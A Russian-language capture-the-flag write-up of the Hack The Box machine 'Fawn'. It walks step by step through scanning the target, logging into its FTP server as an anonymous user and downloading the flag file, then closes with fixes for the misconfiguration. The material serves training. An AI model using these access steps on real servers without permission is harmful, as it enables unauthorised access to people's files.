# 📘 Hack The Box: Fawn

> 🔗 https://app.hackthebox.com/machines/Fawn

---

## 🎯 Цель

Получить доступ к FTP-серверу и извлечь файл с флагом.

---

## 🧠 Ключевая идея

Сервер настроен неправильно (misconfiguration):
- разрешён вход без логина (anonymous)
- нет защиты доступа

Это позволяет любому пользователю получить доступ к файлам.

---

## 🔍 Ход решения (очень подробно)

### Шаг 1 — Проверка соединения

```
ping <TARGET_IP>
```

📌 Что происходит:
Мы проверяем, доступна ли машина.  
Если есть ответ — значит мы подключены к сети HTB.

---

### Шаг 2 — Сканирование портов

```
nmap -sV <TARGET_IP>
```

📌 Что происходит:
Мы ищем открытые порты и узнаём, какие сервисы работают.

📌 Результат:
- 21/tcp открыт
- сервис: ftp
- версия: vsftpd 3.0.3
- ОС: Unix

---

### Шаг 3 — Подключение к FTP

```
ftp <TARGET_IP>
```

📌 Что происходит:
Мы подключаемся к серверу и получаем приглашение ввести логин.

---

### Шаг 4 — Вход без пароля

```
Username: anonymous
Password: (любой или Enter)
```

📌 Что происходит:
Сервер разрешает вход без аккаунта — это и есть уязвимость.

---

### Шаг 5 — Просмотр файлов

```
ls
```

📌 Что происходит:
Мы смотрим, какие файлы есть на сервере.

📌 Находим:
```
flag.txt
```

---

### Шаг 6 — Скачивание файла

```
get flag.txt
```

📌 Что происходит:
Мы скачиваем файл себе на компьютер.

---

### Шаг 7 — Чтение флага

```
cat flag.txt
```

📌 Получаем флаг:
```
***
```

---

## 💥 Уязвимость

- включён anonymous доступ  
- нет аутентификации  
- FTP передаёт данные без шифрования  

👉 Это позволяет любому скачать файлы.

---

## 🛡️ Рекомендации

- отключить anonymous login  
- использовать SFTP вместо FTP  
- настроить аутентификацию  
- ограничить доступ по IP
